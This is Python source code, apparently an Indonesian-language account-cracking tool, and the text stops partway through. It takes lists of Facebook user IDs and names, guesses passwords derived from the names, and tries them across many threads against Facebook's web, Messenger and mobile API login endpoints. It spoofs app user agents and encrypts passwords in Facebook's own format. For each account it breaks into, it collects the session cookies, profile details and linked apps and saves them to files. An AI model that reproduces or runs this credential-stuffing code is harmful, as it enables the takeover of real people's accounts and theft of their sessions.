
import re, os, requests, time, random, json, uuid, base64, hashlib, string, io, struct, nacl.utils
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parse
from datetime import datetime

from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes 
from nacl.public import PrivateKey, PublicKey, Box
from nacl.bindings import crypto_box_NONCEBYTES
from hashlib import blake2b

from Useragent.myuseragent import GenerateUseragent

DUMP, METODE, OK, CP, LOG, LOOPING = [],[],[],[],[],0
waktu = datetime.now().strftime("%d-%m-%Y")

A = "\033[90m"   # Abu-abu
B = "\033[94m"   # Biru
C = "\033[96m"   # Cyan
D = "\033[91m"   # Merah
F = "\033[35m"   # Magenta
G = "\033[92m"   # Hijau Muda
H = "\033[37m"   # Putih

class FacebookAsset:
	def __init__(Jar):
		Jar.ActiveApps, Jar.ExpiredApps = [], []
		Jar.default_headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','host': 'www.facebook.com','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','upgrade-insecure-requests': '1'}
		Jar.yahahaha = 32 + 16  
	
	def get_data(Jar, req):
		try:
			av = re.search(r'"actorID":"(.*?)"',str(req)).group(1)
			__user = av
			__a = str(random.randrange(1,6))
			__hs = re.search(r'"haste_session":"(.*?)"',str(req)).group(1)
			__ccg = re.search(r'"connectionClass":"(.*?)"',str(req)).group(1)
			__rev = re.search(r'"__spin_r":(.*?),',str(req)).group(1)
			__spin_r = __rev
			__spin_b = re.search(r'"__spin_b":"(.*?)"',str(req)).group(1)
			__spin_t = re.search(r'"__spin_t":(.*?),',str(req)).group(1)
			__hsi = re.search(r'"hsi":"(.*?)"',str(req)).group(1)
			fb_dtsg = re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}',str(req)).group(1)
			jazoest = re.search(r'jazoest=(.*?)"',str(req)).group(1)
			lsd = re.search(r'"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1)
			Data = {'av':av,'__user':__user,'__a':__a,'__hs':__hs,'dpr':'1.5','__ccg':__ccg,'__rev':__rev,'__spin_r':__spin_r,'__spin_b':__spin_b,'__spin_t':__spin_t,'__hsi':__hsi,'__comet_req':'15','fb_dtsg':fb_dtsg,'jazoest':jazoest,'lsd':lsd}
			return(Data)
		except Exception as e: print(e)
		
	def get_user_profile(Jar, cookie):
		try:
			token = Jar.access_token(cookie)
			user_data = Jar.user_profile(cookie, token)
			
			if not user_data:
				raise ValueError(" > Gagal mengambil data profil.")
			
			profile_info = user_data.get('response', {})
			friends_info = user_data.get('response2', {})
			followers_info = user_data.get('response3', {})
			posts_info = user_data.get('response4', {})
			
			return {
				'nama': profile_info.get('name'),
				'gender': profile_info.get('gender'),
				'friends': friends_info.get('summary', {}).get('total_count', 0),
				'followers': followers_info.get('subscribers', {}).get('summary', {}).get('total_count', 0),
				'postingan': len(posts_info.get('posts', {}).get('data', []))
			}
			
		except Exception as e:
			return {}
	
	def access_token(Jar, cookie):
		try:
			with requests.Session() as r:
				response = r.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies={'cookie': cookie}).text.replace('\\', '')
				
				act_id = re.search(r'act=(\d+)', response)
				if not act_id:
					raise ValueError(" > Gagal menemukan act ID.")
					
				response2 = r.get(f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act_id.group(1)}&breakdown_regrouping=1&nav_source=no_referrer', cookies={'cookie': cookie}).text.replace('\\', '')
				token = re.search(r'accessToken="(.*?)"', response2)
				if not token:
					raise ValueError(" > Token tidak ditemukan.")
				
				return token.group(1)
		except Exception as e:
			return None
	
	def user_profile(Jar, cookie:str, token:str):
		try:
			with requests.Session() as r:
				response = r.get('https://graph.facebook.com/me?fields=id,name,gender&access_token={}'.format(token), cookies={'cookie':cookie}).json()
				response2 = r.get('https://graph.facebook.com/me/friends?limit=0&access_token={}'.format(token), cookies={'cookie':cookie}).json()
				response3 = r.get('https://graph.facebook.com/me?fields=subscribers.fields(id).limit(0)&access_token={}'.format(token), cookies={'cookie':cookie}).json()
				response4 = r.get('https://graph.facebook.com/me?fields=posts.fields(id).limit(5000)&access_token={}'.format(token), cookies={'cookie':cookie}).json()
				return {
					'response': response,
					'response2': response2,
					'response3': response3,
					'response4': response4
				}
		except Exception as e:
			return {}
	
	def get_app(Jar, cookie):
		try:
			Jar.cookie = cookie
			with requests.Session() as r:
				r.headers.update(Jar.default_headers)
				response = r.get('https://www.facebook.com/', cookies={'cookie':Jar.cookie}, allow_redirects=True).text.replace('\\','')
				Jar.Data = Jar.get_data(response)
				Jar.Data.update({'fb_api_caller_class':'RelayModern','server_timestamps':True})
				Jar.checkapp('activeApps', '4711129059016316')
				Jar.checkapp('expiredApps', '4802508009803010')
				return({'active':Jar.ActiveApps,'expired':Jar.ExpiredApps})
		except Exception:
			return {'active': [], 'expired': []}
	
	def checkapp(Jar, node, doc_id):
		Data = Jar.Data.copy()
		Data.update({'fb_api_req_friendly_name':'ApplicationAndWebsitePaginatedSettingAppGridListActiveQuery','doc_id':doc_id})
		Jar.loop_check(Data, node, None)
		
	def loop_check(Jar, data, node, cursor):
		try:
			with requests.Session() as r:
				data.update({'variables': json.dumps({"after": cursor, "first": 6, "id": data['__user']})})
				response = r.post('https://www.facebook.com/api/graphql/', data=data, cookies={'cookie':Jar.cookie}).json()
				for rara in response['data']['node'][node]['edges']:
					
					app_data = rara["node"]["apps_and_websites_view"]["detailView"]
					app_info = {
						'name': app_data["app_name"],
						'status': app_data["app_status"],
						'date': Jar.timestamp(app_data["install_timestamp"])
					}
					
					if node == 'activeApps':
						Jar.ActiveApps.append(app_info)
					else:
						Jar.ExpiredApps.append(app_info)
						
				if response['data']['node'][node]['page_info']['has_next_page']:
					cursor = response['data']['node'][node]['page_info']['end_cursor']
					Jar.loop_check(data, node, cursor)
		except Exception as e:
			pass
	
	def timestamp(Jar, timestamp):
		try:
			time = datetime.utcfromtimestamp(int(timestamp))
			day, month, year = time.day, ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'][time.month - 1], time.year
			return f"{day} {month} {year}"
		except Exception as e:
			return ''
	
	def pwd_key_fetch(Jar):
		try:
			with requests.Session() as r:
				r.headers.update({
					'host': 'b-graph.facebook.com',
					'x-fb-device-group': '5790',
					'x-fb-friendly-name': 'pwdKeyFetch',
					'x-fb-connection-quality': 'EXCELLENT',
					'x-fb-sim-hni': '51011',
					'user-agent': '[FBAN/FB4A;FBAV/486.0.0.66.70;FBBV/653066364;FBDM/{density=1.7125,width=720,height=1471};FBLC/id_ID;FBRV/0;FBCR/3;FBMF/ITEL;FBBD/Itel;FBPN/com.facebook.mahos;FBDV/itel S666LN;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]',
					'x-fb-connection-bandwidth': '2771664',
					'x-tigon-is-retry': 'False',
					'authorization': 'OAuth null',
					'x-fb-connection-type': 'MOBILE.LTE',
					'content-type': 'application/x-www-form-urlencoded',
					'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
					'x-fb-http-engine': 'Tigon/Liger',
					'x-fb-client-ip': 'True',
					'x-fb-server-cluster': 'True'
				})
				data = {
					'device_id': str(uuid.uuid4()),
					'version': "2",
					'flow': "CONTROLLER_INITIALIZATION",
					'locale': "id_ID",
					'client_country_code': "ID",
					'method': "GET",
					'fb_api_req_friendly_name': "pwdKeyFetch",
					'fb_api_caller_class': "Fb4aAuthHandler",
					'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
				}
				response = r.post('https://b-graph.facebook.com//pwd_key_fetch', data=data).json()
				return {
					'public_key': response.get('public_key'),
					'key_id': response.get('key_id')
				}
		except (requests.exceptions.ConnectionError):
			return {
				'public_key': None,
				'key_id': None,
			}
			
	def encrypt_passworhd(Jar, password, public_key, key_id):
		rand_key = get_random_bytes(32)
		iv = get_random_bytes(12)
		pubkey_bytes = public_key
		pubkey = RSA.import_key(pubkey_bytes)
		cipher_rsa = PKCS1_v1_5.new(pubkey)
		encrypted_rand_key = cipher_rsa.encrypt(rand_key)
		cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
		current_time = int(time.time())
		cipher_aes.update(str(current_time).encode("utf-8"))
		encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
		buf = io.BytesIO()
		buf.write(bytes([1, int(key_id)]))
		buf.write(iv)
		buf.write(struct.pack("<h", len(encrypted_rand_key)))
		buf.write(encrypted_rand_key)
		buf.write(auth_tag)
		buf.write(encrypted_passwd)
		encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
		return f"#PWD_BROWSER:5:{current_time}:{encoded}"
	
	def apacoba(Jar, x: bytes, y: bytes) -> bytes:
		apcoba = blake2b(digest_size=crypto_box_NONCEBYTES)
		apcoba.update(x)
		apcoba.update(y)
		return apcoba.digest()
	
	def tafakkk(Jar, message: bytes, pk: bytes) -> bytes:
		sk = PrivateKey.generate()
		ek = sk.public_key
		nonce = Jar.apacoba(bytes(ek), pk)
		box = Box(sk, PublicKey(pk))
		encrypted = box.encrypt(message, nonce)
		return bytes(ek) + encrypted.ciphertext
	
	def encrypt_password(Jar, password: str, timestamp: int, public_key: str, key_id: int) -> str:
		pwd_bytes = password.encode()
		iv = bytes(12)
		timestamp_bytes = str(timestamp).encode()
		key = os.urandom(32)
		cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
		cipher.update(timestamp_bytes)
		enc_pwd, tag = cipher.encrypt_and_digest(pwd_bytes)
		public_key_bytes = bytes.fromhex(public_key)
		encrypted_key = Jar.tafakkk(key, public_key_bytes)
		data_length = 36 + Jar.yahahaha + len(pwd_bytes)
		data = bytearray(data_length)  
		data[0] = 1
		data[1] = key_id
		data[2:4] = len(encrypted_key).to_bytes(2, 'little')
		data[4:4+len(encrypted_key)] = encrypted_key
		data[4+len(encrypted_key):] = tag + enc_pwd
		encoded = b64encode(data).decode()
		return f"#PWD_BROWSER:5:{timestamp}:{encoded}"
		
	def generate_key_hash(Jar):
		random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=64))
		key_hash = hashlib.sha256(random_string.encode()).hexdigest()
		return key_hash
		
class MAIN:
	def __init__(Jar, userid):
		Jar.x = userid
		
	def Run(Jar):
		
		print("""
 > 1. Log-in facebook wbloks
 > 2. Log-in app facebook (portal.fb)
		""")
		
		query = input(' > pilih menu [1/2]:')
		if query == '1' or query == '01': LOG.append('A1')
		elif query == '2' or query == '02': LOG.append('A2')
		elif query == '3' or query == '03': LOG.append('A3')
		print()
		SETTING().Run(Jar.x)

class SETTING:
	
	def GeneratePassword(Jar, name):
		password = []
		password.append('karawang')
		password.append('karawang123')
		for nama in name.split(' '):
			if len(name) <= 5:
				if len(nama) < 3:
					continue
				else:
					password.append(nama.lower() + '123')
					password.append(nama.lower() + '1234')
					password.append(nama.lower() + '12345')
			else:
				if len(nama) < 3:
					password.append(name.lower())
				else:
					password.append(name.lower())
					password.append(nama.lower() + '123')
					password.append(nama.lower() + '1234')
					password.append(nama.lower() + '12345')
		password_ = []
		for x in password:
			if str(x) in str(password_):
				continue
			else:
				password_.append(x)
		return(password_)
		
	def ua_api(Jar):
		useragent = random.choice([
			'[FBAN/FB4A;FBAV/486.0.0.66.70;FBBV/653066364;FBDM/{density=1.67,width=1267,height=2281};FBLC/id_ID;FBRV/0;FBCR/XL Axiata;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO LI7;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]',
			'[FBAN/FB4A;FBAV/486.0.0.66.70;FBBV/653066364;FBDM/{density=2.84,width=921,height=1801};FBLC/id_ID;FBRV/0;FBCR/3;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/23053RN02A;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]',
			'[FBAN/FB4A;FBAV/486.0.0.66.70;FBBV/653066364;FBDM/{density=2.48,width=1407,height=1978};FBLC/id_ID;FBRV/0;FBCR/TELKOMSEL;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/22111317PG;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]',
			'[FBAN/FB4A;FBAV/486.0.0.66.70;FBBV/653066364;FBDM/{density=3.54,width=1055,height=2055};FBLC/id_ID;FBRV/0;FBCR/None;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2591;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]',
			'[FBAN/FB4A;FBAV/486.0.0.66.70;FBBV/653066364;FBDM/{density=2.72,width=760,height=1572};FBLC/id_ID;FBRV/0;FBCR/XL Axiata;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A135F;FBSV/14;FBOP/1;FBCA/armeabi-v7a:;]',
			'[FBAN/FB4A;FBAV/486.0.0.66.70;FBBV/653066364;FBDM/{density=3.18,width=985,height=2442};FBLC/id_ID;FBRV/0;FBCR/None;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 2007;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
		])
		return useragent
		
	def GeneratePassword2(Jar, full_name):
		nama = full_name.lower()
		nama_split = nama.split()
		nama_depan = nama_split[0] if len(nama_split) > 0 else ""
		nama_belakang = nama_split[1] if len(nama_split) > 1 else ""
		password = set()
		if len(nama_depan) >= 3:
			password.update([
				nama_depan + "123",
				nama_depan + "12345",
				nama_depan + nama_belakang,
				"karawang",
				"karawang123"
			])
		if len(nama_belakang) >= 3:  
			password.update([
				nama_belakang + "123",
				nama_belakang + "12345",
				nama_belakang + nama_depan,
				"karawang",
				"karawang123"
			])
			
		return list(password)
		
	def Run(Jar, Dump):
		with ThreadPoolExecutor(max_workers=35) as Z:
			for data in Dump:
				try:
					userid, full_name = data.split('|')
					nama = full_name.strip()
					password = Jar.GeneratePassword2(nama)
					if 'A1' in LOG:
						Z.submit(Jar.Webregular, Dump, userid, password)
					elif 'A2' in LOG:
						Z.submit(Jar.AppFacebook, Dump, userid, password)
					elif 'A3' in LOG:
						Z.submit(Jar.LoginAsync, Dump, userid, password)
					else:
						Z.submit(Jar.WbloksMethod, Dump, userid, password)
				except:pass
		exit("Selesai")
	
	def WebMessenger(Jar, Dump, user, password):
		global LOOPING, OK, CP
		print(f' Progress {LOOPING}|{len(Dump)} > Log-in: {G}{len(OK)}{H} > Failed: {D}{len(CP)}{H} ', end='\r')
		try:
			for pw in password:
				system = random.choice([True, False])
				useragent = GenerateUseragent().useragent(system=system)
				with requests.Session() as r:
					r.headers.update({
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
						'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
						'sec-fetch-site': 'cross-site',
						'referer': 'https://www.google.com/',
						'sec-ch-ua-platform': '"Linux"',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-dest': 'document',
						'sec-ch-ua-mobile': '?0',
						'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
						'host': 'www.messenger.com',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
					})
					response = r.get('https://www.messenger.com/', allow_redirects=True)
					rara = parse(response.text, "html.parser")
					try:
						public_key = re.search(r'"publicKey":"(.*?)"', response.text).group(1)
						key_id = int(re.search('"keyId":(\d+)', response.text).group(1))
						jazoest = rara.find("input", {"name": "jazoest"})["value"]
						lsd = rara.find("input", {"name": "lsd"})["value"]
						request_id = rara.find("input", {"name": "initial_request_id"})["value"]
						lgnrnd = rara.find("input", {"name": "lgnrnd"})["value"]
						lgnjs = rara.find("input", {"name": "lgnjs"})["value"]
						__spin_t = re.search('"__spin_t":(\d+)', response.text).group(1)
					except AttributeError as e:
						print(e)
						time.sleep(7.0)
						continue			
					enpas = FacebookAsset().encpass(pw, __spin_t, public_key, key_id)
					print(enpas)
					data = {
						"jazoest": jazoest,
						"lsd": lsd,
						"initial_request_id": request_id,
						"timezone": "-420",
						"lgndim": "",
						"lgnrnd": lgnrnd,
						"lgnjs": lgnjs,
						"email": user,
						"pass": enpas,
						"default_persistent": ""
					}
					headers = {
						'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
						'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
						'cache-control': "max-age=0",
						'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
						'sec-ch-ua-mobile': "?0",
						'sec-ch-ua-platform': "\"Linux\"",
						'origin': "https://www.messenger.com",
						'upgrade-insecure-requests': "1",
						'sec-fetch-site': "same-origin",
						'sec-fetch-mode': "navigate",
						'sec-fetch-user': "?1",
						'sec-fetch-dest': "document",
						'referer': response.url,
						'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
						'priority': "u=0, i",
						'Cookie': ';'.join([str(x) +'='+ str(y) for x, y in r.cookies.get_dict().items()])
					}
					response2 = r.post('https://www.messenger.com/login/password/',data=data, headers=headers, allow_redirects=True)
					print(response2.text)
					cookie = ';'.join([str(x) +'='+ str(y) for x, y in r.cookies.get_dict().items()])
					print(cookie)
					if 'c_user' in r.cookies.get_dict().keys():
						cookie = ';'.join([str(x) +'='+ str(y) for x, y in r.cookies.get_dict().items()])
						profile_data = FacebookAsset().get_user_profile(cookie)
						if profile_data:
							nama = profile_data.get('nama')
							gender = profile_data.get('gender')
							friends = profile_data.get('friends')
							followers = profile_data.get('followers')
							post = profile_data.get('postingan')
						else:
							nama, gender, friends, followers, post = None, None, None, None, None
							
						result = FacebookAsset().get_app(cookie)
						
						print(f"""\r{' ' * 76}
 {'Userid'.ljust(10)}: {G}{user}{H}
 {'Nama'.ljust(10)}: {G}{nama}{H}
 {'Gender'.ljust(10)}: {G}{gender}{H}
 {'Cookies'.ljust(10)}: {G}{cookie}{H}
 {'Password'.ljust(10)}: {G}{pw}{H}
 {'Friends'.ljust(10)}: {G}{friends}{H}
 {'Followers'.ljust(10)}: {G}{followers}{H}
 {'Postingan'.ljust(10)}: {G}{post}{H}
 Aplikasi
{G}{''.join([f"  {app['name']} {app['status']} {app['date']}\n" for app in result['active']])}{H}
{D}{''.join([f"  {app['name']} {app['status']} {app['date']}\n" for app in result['expired']])}{H}
						""")
						
						OK.append(f'{user}|{pw}|{cookie}')
						open(f'Ressults/Login/OK-{waktu}.txt', 'a').write(f'{user}|{pw}|{cookie}\n')
						break
					elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in response2.text:
						CP.append(f'{user}|{pw}')
						open(f'Ressults/Checkpoint/CP-{waktu}.txt', 'a').write(f'{user}|{pw}\n')
						break
					elif "com.bloks.www.two_step_verification.entrypoint" in response2.text:
						CP.append(f'{user}|{pw}')
						open(f'Ressults/Checkpoint/Cp-A2f-Wbloks-{waktu}.txt', 'a').write(f'{user}|{pw}\n')
						break
					elif 'checkpoint' in r.cookies.get_dict():
						CP.append(f'{user}|{pw}')
						open(f'Ressults/Checkpoint/CP-{waktu}.txt', 'a').write(f'{user}|{pw}\n')
						break
			LOOPING += 1
		except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
			time.sleep(15)
			Jar.WbloksMethod(Dump, user, pw)
	
	def AppFacebook(Jar, Dump, user, password):
		global LOOPING, OK, CP
		print(f' Graph Progress {LOOPING}|{len(Dump)} > Log-in: {G}{len(OK)}{H} > Failed: {D}{len(CP)}{H} ', end='\r')
		try:
			useragent = Jar.ua_api()
			pwd = FacebookAsset().pwd_key_fetch()
			for pw in password:
				with requests.Session() as r:
					enpas = FacebookAsset().encrypt_password(pw, pwd['public_key'], pwd['key_id'])
					enpas = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
					family = str(uuid.uuid4())
					dev_id = str(uuid.uuid4())
					key_has = FacebookAsset().generate_key_hash()
					data = {
						'method': "post",
						'pretty': "false",
						'format': "json",
						'server_timestamps': "true",
						'locale': "id_ID",
						'purpose': "fetch",
						'fb_api_req_friendly_name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
						'fb_api_caller_class': "graphservice",
						'client_doc_id': "119940804214876861379510865434",
						'variables': json.dumps({"params":{"params":"{\"params\":\"{\\\"client_input_params\\\":{\\\"sim_phones\\\":[],\\\"secure_family_device_id\\\":\\\""+str(uuid.uuid4())+"\\\",\\\"attestation_result\\\":{\\\"data\\\":\\\"eyJjaGFsbGVuZ2Vfbm9uY2UiOiI0OE00Q01vZmRaZENBcW9hempmWGlIWGVmcDVzYkh2OE5weVllZmh0L3JnPSIsInVzZXJuYW1lIjoic2FlcHVsZmFqYXI1NjhAZ21haWwuY29tIn0=\\\",\\\"signature\\\":\\\"MEQCIEbr7VAJmM3WXExz2B+0QTDKhTBTb7HsWdLF4CfPm3DwAiALmmR17Y9KUui+4fkBM9THkoEsPng4SgLgbPPGA72zZQ==\\\",\\\"keyHash\\\":\\\""+key_has+"\\\"},\\\"has_granted_read_contacts_permissions\\\":0,\\\"auth_secure_device_id\\\":\\\"\\\",\\\"has_whatsapp_installed\\\":1,\\\"password\\\":\\\""+enpas+"\\\",\\\"sso_token_map_json_string\\\":\\\"\\\",\\\"event_flow\\\":\\\"login_manual\\\",\\\"password_contains_non_ascii\\\":\\\"false\\\",\\\"sim_serials\\\":[],\\\"client_known_key_hash\\\":\\\"\\\",\\\"encrypted_msisdn\\\":\\\"\\\",\\\"has_granted_read_phone_permissions\\\":0,\\\"app_manager_id\\\":\\\"\\\",\\\"should_show_nested_nta_from_aymh\\\":0,\\\"device_id\\\":\\\""+dev_id+"\\\",\\\"login_attempt_count\\\":1,\\\"machine_id\\\":\\\"\\\",\\\"flash_call_permission_status\\\":{\\\"READ_PHONE_STATE\\\":\\\"DENIED\\\",\\\"READ_CALL_LOG\\\":\\\"DENIED\\\",\\\"ANSWER_PHONE_CALLS\\\":\\\"DENIED\\\"},\\\"accounts_list\\\":[],\\\"family_device_id\\\":\\\""+family+"\\\",\\\"fb_ig_device_id\\\":[],\\\"device_emails\\\":[],\\\"try_num\\\":4,\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\"},\\\"event_step\\\":\\\"home_page\\\",\\\"headers_infra_flow_id\\\":\\\"\\\",\\\"openid_tokens\\\":{},\\\"contact_point\\\":\\\""+user+"\\\"},\\\"server_params\\\":{\\\"should_trigger_override_login_2fa_action\\\":0,\\\"is_from_logged_out\\\":0,\\\"should_trigger_override_login_success_action\\\":0,\\\"login_credential_type\\\":\\\"none\\\",\\\"server_login_source\\\":\\\"login\\\",\\\"waterfall_id\\\":\\\""+str(uuid.uuid4())+"\\\",\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"pw_encryption_try_count\\\":1,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"is_from_landing_page\\\":0,\\\"password_text_input_id\\\":\\\"n4kqb6:99\\\",\\\"is_from_empty_password\\\":0,\\\"is_from_msplit_fallback\\\":0,\\\"ar_event_source\\\":\\\"login_home_page\\\",\\\"username_text_input_id\\\":\\\"n4kqb6:98\\\",\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\""+dev_id+"\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":1.39840773000635E14,\\\"reg_flow_source\\\":\\\"login_home_native_integration_point\\\",\\\"is_caa_perf_enabled\\\":1,\\\"credential_type\\\":\\\"password\\\",\\\"is_from_password_entry_page\\\":0,\\\"caller\\\":\\\"gslr\\\",\\\"family_device_id\\\":\\\""+family+"\\\",\\\"is_from_assistive_id\\\":0,\\\"access_flow_version\\\":\\\"pre_mt_behavior\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.bloks.caa.login.async.send_login_request"},"scale":"2","nt_context":{"using_white_navbar":True,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":2,"is_push_on":True,"debug_tooling_metadata_token":None,"is_flipper_enabled":False,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}),
						'fb_api_analytics_tags': '["GraphServices"]',
						'client_trace_id': str(uuid.uuid4())
					}
					r.headers.update({
						'host': 'b-graph.facebook.com',
						'x-fb-connection-type': 'MOBILE.LTE',
						'user-agent': useragent,
						'x-tigon-is-retry': 'False',
						'x-fb-device-group': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items()]))),
						'x-graphql-request-purpose': 'fetch',
						'x-fb-privacy-context': '3643298472347298',
						'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
						'x-graphql-client-library': 'graphservice',
						'content-type': 'application/x-www-form-urlencoded',
						'x-fb-net-hni': '51011',
						'x-fb-sim-hni': '51011',
						'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
						'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
						'accept-encoding': 'gzip, deflate',
						'x-fb-http-engine': 'Tigon/Liger',
						'x-fb-client-ip': 'True',
						'x-fb-server-cluster': 'True'
					})
					response = r.post('https://b-graph.facebook.com/graphql', data=data, allow_redirects=True)
					print(pw)
					if "c_user" in response.text.replace('\\', '') or "access_token" in response.text:
						cokie = {
							"datr": re.search('"name":"datr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
							"sb": base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-"),
							"fr": re.search('"name":"fr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
							"c_user": re.search('"name":"c_user","value":"(\d+)"', response.text.replace('\\', '')).group(1),
							"xs": re.search('"name":"xs","value":"(.*?)"', response.text.replace('\\', '')).group(1),
						}
						cookie = ";".join(f"{key}={value}" for key, value in cokie.items() if value)
						profile_data = FacebookAsset().get_user_profile(cookie)
						if profile_data:
							nama = profile_data.get('nama')
							gender = profile_data.get('gender')
							friends = profile_data.get('friends')
							followers = profile_data.get('followers')
							post = profile_data.get('postingan')
						else:
							nama, gender, friends, followers, post = None, None, None, None, None
						print(f"""\r{' ' * 76}
 Nama: {G}{nama}{H}
 Userid: {G}{user}{H}
 account: {G}{friends}{H}|{G}{followers}{H}|{G}{gender}{H}|{G}{post}{H}
 Cookie: {G}{cookie}{H}
 Password: {G}{pw}{H}""")
						OK.append(f'{user}|{pw}|{cookie}')
						open(f'Ressults/Login/OK-Api-{waktu}.txt', 'a').write(f'{user}|{pw}|{cookie}\n')
						break
					elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in response.text:
						CP.append(f'{user}|{pw}')
						print(f"""\r{' ' * 76}
 Userid: {D}{user}{H}
 Useragent: {D}{r.headers.get('user-agent')}{H}
 Password: {D}{pw}{H}""")
						open(f'Ressults/Checkpoint/Cp-API-{waktu}.txt', 'a').write(f'{user}|{pw}\n')
						break
					elif 'error_user_title' in response.text.replace('\\', '') or 'checkpoint' in response.text.replace('\\', ''):
						CP.append(f'{user}|{pw}')
						print(f"""\r{' ' * 76}
 Userid: {D}{user}{H}
 Useragent: {D}{r.headers.get('user-agent')}{H}
 Password: {D}{pw}{H}""")
						open(f'Ressults/Checkpoint/Cp-API-{waktu}.txt', 'a').write(f'{user}|{pw}\n')
						break
			LOOPING += 1
		except (requests.exceptions.ConnectionError):
			time.sleep(30)
			Jar.AppFacebook(Dump, user, pw)
	
	def Webregular(Jar, Dump, user, password):
		global LOOPING, OK, CP
		print(f' Wbloks {LOOPING}|{len(Dump)} > Log-in: {G}{len(OK)}{H} > Failed: {D}{len(CP)}{H} ', end='\r')
		try:
			for pw in password:
				with requests.Session() as r:
					system = random.choice([True, False])
					useragent = GenerateUseragent().useragent(system=system)
					url = 'm.facebook.com'
					r.headers.update({
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
						'upgrade-insecure-requests': '1',
						'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
						'host': url,
						'sec-fetch-site': "same-origin",
						'sec-fetch-mode': "navigate",
						'referer': 'https://www.google.com/',
						'user-agent': useragent,
						'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
						'sec-fetch-dest': "document",
					})
					response = r.get(f'https://{r.headers["host"]}/login/', allow_redirects=True)
					try:
						jazoest_ = re.search(r'"jazoest", "(\d+)"', response.text.replace('\\','')).group(1)
						dtsg = re.search(r'"dtsg":{"token":"(.*?)"', response.text.replace('\\','')).group(1)
